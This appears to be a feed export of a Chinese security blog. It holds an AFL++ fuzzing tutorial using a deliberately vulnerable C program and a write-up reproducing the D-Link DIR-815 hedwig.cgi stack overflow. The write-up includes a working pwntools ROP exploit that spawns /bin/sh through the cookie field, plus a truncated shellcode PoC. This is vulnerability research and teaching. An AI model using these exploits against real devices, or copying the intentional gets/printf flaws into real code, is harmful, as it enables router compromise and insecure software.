    <summary type="html">&lt;h1 id=&quot;CVE-2023-34644&quot;&gt;&lt;a href=&quot;#CVE-2023-34644&quot; class=&quot;headerlink&quot; title=&quot;CVE-2023-34644&quot;&gt;&lt;/a&gt;CVE-2023-34644&lt;/h1&gt;&lt;h2 id=&quot;luci框架和lua文件&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Fuzz初探</title>
    <link href="http://s1nec-1o.github.io/2024/05/26/Fuzz%E5%88%9D%E6%8E%A2/"/>
    <id>http://s1nec-1o.github.io/2024/05/26/Fuzz%E5%88%9D%E6%8E%A2/</id>
    <published>2024-05-25T17:02:21.000Z</published>
    <updated>2024-05-25T17:10:55.053Z</updated>
    
    <content type="html"><![CDATA[<p>看网上的评价fuzz好像是挖漏洞的首选工具，就先浅浅学习一下，或许可以找找ctf的应用场景，先从AFL++开始</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在安装之前AFL++要求要有llvm和clang,ldd,gcc等编译器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install wget</span><br><span class="line">wget https://apt.llvm.org/llvm.sh</span><br><span class="line"><span class="built_in">chmod</span> +x llvm.sh</span><br><span class="line">sudo ./llvm.sh 13</span><br><span class="line">sudo apt install clang-13 lld-13 llvm-13</span><br></pre></td></tr></table></figure><p>之后更新环境变量</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/lib/llvm-13/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=/usr/lib/llvm-13/bin:$PATH&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>记住export只对本shell生效，bashrc只对之后起的shell生效</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure><p> 假设输出显示您的GCC版本是9.xx.xx</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-9-plugin-dev</span><br></pre></td></tr></table></figure><p>之后便可以下载依赖然后下载AFL++之后编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">$ sudo apt install git make build-essential clang ninja-build pkg-config libglib2.0-dev libpixman-1-dev</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.91chi.fun/https://github.com/AFLplusplus/AFLplusplus.git</span><br><span class="line">$ <span class="built_in">cd</span> AFLplusplus</span><br><span class="line">$ make all</span><br></pre></td></tr></table></figure><p>这样没有error的话就完成AFL++的基本安装</p><p>如果报错就看报错解决，先百度，如果有网上没有的话可以与我讨论，即使我大概率也不会</p><h2 id="AFL-的使用"><a href="#AFL-的使用" class="headerlink" title="AFL++的使用"></a>AFL++的使用</h2><p>首先是测试，就借用[网上的源码](<a href="https://xz.aliyun.com/t/4314?time__1311=n4+xnD0D9DgDcBQKDtD/ia4BK+bxIxiIo2t4x#toc-3">初探AFL-Fuzz - 先知社区 (aliyun.com)</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="有源码的fuzz"><a href="#有源码的fuzz" class="headerlink" title="有源码的fuzz"></a>有源码的fuzz</h3><p>首先是编译器的选择<a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#a-selecting-the-best-afl-compiler-for-instrumenting-the-target">官方文档</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-clang-lto ./afl_test.c -o afl_test</span><br></pre></td></tr></table></figure><p>对那些可以直接从stdin读取输入的目标程序来说，语法如下：<br><code>./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</code><br>对从文件读取输入的目标程序来说，要用“@@”，语法如下：<br><code>./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i fuzz_in -o fuzz_out ./afl_test</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405260110406.png" alt="image-20240526003227700"></p><p>这样三个区域要注意的</p><p>process time,overall result,findings in depth</p><p>主要是total crashes可以看到几个被保留，先知社区那篇AFL便有细讲</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bamboo@bamboo-virtual-machine:~/test/fuzz_out/default/crashes$ xxd id:000000,sig:11,src:000002,time:525,execs:641,op:havoc,rep:2</span><br><span class="line">00000000: 4646 ff61 6161                           FF.aaa           //异常</span><br><span class="line">bamboo@bamboo-virtual-machine:~/test/fuzz_out/default/crashes$ xxd id:000001,sig:11,src:000002,time:2133,execs:2603,op:havoc,rep:30</span><br><span class="line">00000000: cfcf cfcf cfcf cfcf cfcf cfcf cfcf cfcf  ................</span><br><span class="line">00000010: cfcf cfcf cfcf cfff 80b2 b2b2 b2b2 b2b2  ................</span><br><span class="line">00000020: b2b2 b2b2 b2b2 b2b2 b2b2 b2b2 b2b2 b2b2  ................</span><br><span class="line">00000030: b2b2 b2b2 4db2 b2b2 b2b2 b2b2 b2cf cfcf  ....M...........</span><br><span class="line">00000040: cfcf cfcf cfcf ff80 9eb2 b2b2 b2b2 b2cf  ................</span><br><span class="line">00000050: cfcf cfcf cfcf cfcf cfcf cfcf cfcf cfcf  ................</span><br><span class="line">00000060: d4cf cf80 b2cf 0064 e2cf cfcf cfcf ff80  .......d........</span><br><span class="line">00000070: 9eb2 97b2 b2b2 b2cf cfcf cfcf cfcf cfcf  ................</span><br><span class="line">00000080: cfcf cfcf b2b2 b2b2 b2b2 9db2 b2b2 b2e6  ................</span><br><span class="line">00000090: ddff                                     ..</span><br><span class="line">bamboo@bamboo-virtual-machine:~/test/fuzz_out/default/crashes$ xxd id:000002,sig:11,src:000002,time:7445,execs:10000,op:havoc,rep:2</span><br><span class="line">00000000: 256e 6161                                %naa              //格式化字符串</span><br><span class="line">bamboo@bamboo-virtual-machine:~/test/fuzz_out/default/crashes$ xxd id:000003,sig:11,src:000001,time:11633,execs:15043,op:havoc,rep:63</span><br><span class="line">00000000: 417f 418e 4141 be41 4141 4141 4140 4129  A.A.AA.AAAAAA@A)</span><br><span class="line">00000010: 4141 4180 4120 415a 5a41 6241 4141 4141  AAA.A AZZAbAAAAA</span><br><span class="line">00000020: 4102 4120 415a 5a3b 3241 4141 4141 4141  A.A AZZ<span class="comment">;2AAAAAAA</span></span><br><span class="line">00000030: 4141 4141 4141 4141 4141 7f36 4141 4141  AAAAAAAAAA.6AAAA</span><br><span class="line">00000040: 4141 0200 4140 4129 4141 4180 4120 415a  AA..A@A)AAA.A AZ</span><br><span class="line">00000050: 5a41 6241 3041 4141 4102 4120 415a 5a3b  ZAbA0AAAA.A AZZ<span class="comment">;</span></span><br><span class="line">00000060: 3241 4140 4141 0241 2041 5a5a 4162 4149  2AA@AA.A AZZAbAI</span><br><span class="line">00000070: 4141 4141 0241 df41 5a5a 4132 4141 4141  AAAA.A.AZZA2AAAA</span><br><span class="line">00000080: 4141 0241 2041 5a64 4141 4100 4041 4100  AA.A AZdAAA.@AA.</span><br><span class="line">00000090: 1b                                       .</span><br><span class="line">bamboo@bamboo-virtual-machine:~/test/fuzz_out/default/crashes$ xxd id:000004,sig:11,src:000001,time:25097,execs:31270,op:havoc,rep:28    //异常2，不过\x00</span><br><span class="line">00000000: 4197 8241 1f87 a4a4 c87f ffc8 c8c8 afaf  A..A............</span><br><span class="line">00000010: af8e afaf afaf afaf afaf 98d8 9898 9898  ................</span><br><span class="line">00000020: 98b8 9897 9898 8e98 9898 9898 9898 9898  ................</span><br><span class="line">00000030: 9898 9898 9898 98af afaf afaf afaf c821  ...............!</span><br><span class="line">00000040: 8820 0000 0002 0003 2017 c8c8 1c         . ...... ....</span><br></pre></td></tr></table></figure><ol><li><strong>id:000001</strong>:<ul><li>这是一个唯一的标识符，用于标识 AFL++ 生成的测试用例。每个新生成的测试用例都会有一个递增的 ID。</li></ul></li><li><strong>sig:11</strong>:<ul><li>这是信号编号，表示程序崩溃时接收到的信号。在这个例子中，<code>11</code> 表示 <code>SIGSEGV</code>（Segmentation Fault），即内存访问违规。</li></ul></li><li><strong>src:000002</strong>:<ul><li>这是生成该测试用例的父测试用例的 ID。它表示此测试用例是从 ID 为 <code>000002</code> 的测试用例变异而来的。</li></ul></li><li><strong>time:2133</strong>:<ul><li>这是 AFL++ 生成该测试用例时的运行时间，单位是毫秒。这里表示 AFL++ 在运行 2133 毫秒后生成了这个测试用例。</li></ul></li><li><strong>execs:2603</strong>:<ul><li>这是 AFL++ 在生成该测试用例时的执行次数。表示 AFL++ 已经执行了 2603 次测试用例。</li></ul></li><li><strong>op:havoc</strong>:<ul><li>这是 AFL++ 用来生成该测试用例的变异操作类型。在这个例子中，<code>havoc</code> 是一种随机变异策略，AFL++ 会对输入进行多种随机变异操作，以发现潜在的漏洞。</li></ul></li><li><strong>rep:30</strong>:<ul><li>这是 AFL++ 在生成该测试用例时重复变异操作的次数。表示该测试用例是在第 30 次变异操作时生成的。</li></ul></li></ol><p>看来里面还是有很多门道的，希望我有一天能参透</p><h3 id="无源码的fuzz"><a href="#无源码的fuzz" class="headerlink" title="无源码的fuzz"></a>无源码的fuzz</h3><p>无源码的要在qemu上运行，确保事先装好system和static的qemu</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> qemu_mode</span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o afl_test2 afl_test.c</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i <span class="keyword">in</span> -o out -Q ./afl_test2</span><br></pre></td></tr></table></figure><p>-Q说明是qemu运行</p><p>之后尝试一些ctf，iot上的应用（算是留个坑），其实我尝试了go的但是跑的很慢很慢，等我有服务器了再用服务器跑（听说跑fuzz烧硬盘</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看网上的评价fuzz好像是挖漏洞的首选工具，就先浅浅学习一下，或许可以找找ctf的应用场景，先从AFL++开始&lt;/p&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;在安装之前AF</summary>
      
    
    
    
    
    <category term="Fuzz" scheme="http://s1nec-1o.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>DIR-815漏洞复现</title>
    <link href="http://s1nec-1o.github.io/2024/05/21/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/05/21/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-05-21T14:21:25.000Z</published>
    <updated>2024-05-21T14:25:22.997Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DIR-815"><a href="#DIR-815" class="headerlink" title="DIR-815"></a>DIR-815</h1><p>仔细研读了winmt师傅和ZIKH26师傅的复现，现在自己来复现一遍</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223733.png" alt="image-20240425225544242" style="zoom:50%;" /><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>该部分可以看<a href="https://zikh26.github.io/posts/d1f081a9.html">ZIKH26师傅的blog</a>，原本是想在师傅的分析上补充的，但是事情太多了，最后看的脑子疼，只能暂且搁置了</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="确认libc-base"><a href="#确认libc-base" class="headerlink" title="确认libc_base"></a>确认libc_base</h3><p>由于该gdb是链接在qemu模式下的，因此不能直接通过vmmap得到libc基址，而直接libc又因为权限不足无法使用，又因为<strong>这个路由设备的真机就是没有开地址随机化的</strong>，因此我们只需要**通过找一个<code>libc</code>函数地址减去偏移来得到<code>libc_base</code>**，而因为“延迟绑定的特性”，要找两个使用libc函数的地址</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223735.png" alt="image-20240422235933593" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223736.png" alt="image-20240423000016590" style="zoom: 50%;" /><p>可以得到memset的地址在0x7f76ca20</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223737.png" alt="image-20240423000125429"></p><p>可以得到libc_base&#x3D;0x7f76ca20-0x034A20&#x3D;0x7F738000</p><h3 id="确认溢出大小"><a href="#确认溢出大小" class="headerlink" title="确认溢出大小"></a>确认溢出大小</h3><p>首先，<code>cyclic 2000 &gt; payload</code>，将生成的<code>2000</code>个字符存放到<code>payload</code>文件中，再用以下<code>shell</code>脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"> </span><br><span class="line">INPUT=<span class="string">&quot;winmt=pwner&quot;</span></span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$INPUT</span>&quot;</span> | <span class="built_in">wc</span> -c)</span><br><span class="line">cookie=<span class="string">&quot;uid=`cat payload`&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INPUT</span> | qemu-mipsel -L ./ -0 <span class="string">&quot;hedwig.cgi&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> -E HTTP_COOKIE=<span class="variable">$cookie</span> -E REQUEST_URI=<span class="string">&quot;2333&quot;</span> -g 1234 ./htdocs/cgibin</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223738.png" alt="image-20240423000624091" style="zoom:50%;" /><p>得到了libc_base和溢出大小，现在就要寻找对应的gadget来提权</p><p>此时的寄存器为</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223739.png" alt="image-20240423194608538" style="zoom:50%;" /><p>发现S8恰好为返回地址的上一位，S7，S6直到S0逐渐递减，因此可以控制S0-S8以此构造ROP链</p><h2 id="qemu用户模式复现"><a href="#qemu用户模式复现" class="headerlink" title="qemu用户模式复现"></a>qemu用户模式复现</h2><h3 id="寻找ROPgadget"><a href="#寻找ROPgadget" class="headerlink" title="寻找ROPgadget"></a>寻找ROPgadget</h3><h4 id="复习一下gadget的寻找"><a href="#复习一下gadget的寻找" class="headerlink" title="复习一下gadget的寻找"></a>复习一下gadget的寻找</h4><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223740.png" alt="image-20240423185734832" style="zoom: 33%;" /><p>其中比较重要的是$v0为函数返回值存放的寄存器，$ra存在返回地址，$a0-$a3存在函数的四个调用参数，当需要使用更多的寄存器时，就需要堆栈（stack)了,需要注意的是MIPS编译器总是为参数在堆栈中留有空间以防有参数需要存储。</p><p>因此对于使用ROP进行一般的函数操作来说，寄存器的四个参数已经足够了，因此控制这个四个寄存器对于ROP来说比较关键。</p><p>在uclibc库中，有几个比较关键的gadget，在<code>scandir</code>的尾部或者<code>scandir64</code>的尾部，从图上看基本上可以设置所有寄存器值，从s0-s7</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223741.png" alt="image-20240423185850706" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223742.png" alt="image-20240423185927880" style="zoom:50%;" /><p>有一条比较常规的ROP链，执行的整体流程为 sleep(1) -&gt; read_value_from_stack -&gt; jump to stack(shellcode)</p><h4 id="布置ROP链"><a href="#布置ROP链" class="headerlink" title="布置ROP链"></a>布置ROP链</h4><p><code>system</code>地址末两位是<code>\x00</code>，而<code>sprintf</code>会被<code>\x00</code>截断，因此这里采用的方法是：<strong>读进去<code>system_addr - 1</code>，再找到<code>addiu ..., 1</code>的<code>gadget</code>对其操作后再跳转过去</strong>。</p><p>因此得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x7F738000</span></span><br><span class="line"><span class="comment">#prepare:</span></span><br><span class="line"><span class="comment">#0x000158C8  |  addiu $s0,1  |  jalr  $s5 </span></span><br><span class="line"><span class="comment">#0x00015B74  |  move $a0,$s2 |  jalr  $s0  </span></span><br><span class="line"></span><br><span class="line">payload=<span class="number">973</span>*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x53200</span>-<span class="number">1</span>)        <span class="comment">#s0 system-1</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s1</span></span><br><span class="line">payload+=p32(libc_base+ <span class="number">0x6DFD0</span>)         <span class="comment">#s2 /bin/sh</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s3</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s4 </span></span><br><span class="line">payload+=p32(libc_base+ <span class="number">0x15B74</span>)         <span class="comment">#s5 move $a0,$s2 |  jalr  $s0                   </span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s6</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s7 </span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s8  </span></span><br><span class="line">payload+=p32(libc_base + <span class="number">0x000158C8</span>)     <span class="comment">#ra addiu $s0,1  |  jalr  $s5 </span></span><br><span class="line">payload=<span class="string">b&#x27;uid=&#x27;</span> + payload</span><br><span class="line"></span><br><span class="line">post_content=<span class="string">b&#x27;s1nec-1o=pwnner&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=11 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">io.send(post_content)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>看了winmt师傅的博客说是用户模式该方法打不通的原因是：这里的<code>system</code>函数中有调用<code>fork()</code>函数，而用户模式是不支持多线程的，这里<code>fork()</code>的失败，会导致后面<code>$fp</code>是个空指针，就会出错，之后在系统模式打就不会出问题了。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223743.png" alt="image-20240423211312592" style="zoom:50%;" /><p>这里就出问题了</p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>到这里需要布置shellcode链，这种做法就不会导致system中的fork使得打不通，因为是直接调用execve，而因为sprintf的0截断，因此shell里不能出现\x00，还要注意不能出现缓存不一致性（需要一个时间来同步），因此先调用一下sleep(1)，再去执行shellcode</p><p>这里还需要提到一个点，因此调用的sleep函数，他的栈会往下移，因此ra和s寄存器的值所在的位置会不一样，我是通过调试确定的，先调试：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223744.png" alt="22e0c1e77961f170faf679ff4d9a3c0a"></p><p>这是先借用winmt师傅的poc，这是到达sleep函数的栈位置可以看到调用sleep的地址-04c与ra所在的地址-004相差了0x48，即18个地址长度，第18个地址就是ra了，再看sleep的源码前面部分：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223745.png" alt="image-20240424191520351"></p><p>发现只有s4-s0，因此可以以此构造ROP链，跳到shellcode，实现ret2shellcode</p><p>在构造ROP链的时候还遇到了很多问题，在jalr到sleep函数的时候，建议间接跳转，因为在sleep函数中会调用各种寄存器，取地址上的值时必须保证寄存器为有效数，而通过间接跳转时，例如在跳转和sleep中间再多加一条链，这样相当于重置寄存器，因为有些寄存器例如gp不会保存就会一直使用等等</p><p>poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#prepare</span></span><br><span class="line"><span class="comment">#0x00057E50  |  li $a0,1                   |  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0x00013F74  |  addiu $s1,$sp,0x28+var_10  |  jalr  $s4 </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0x7F738000</span></span><br><span class="line"> </span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x3cd</span></span><br><span 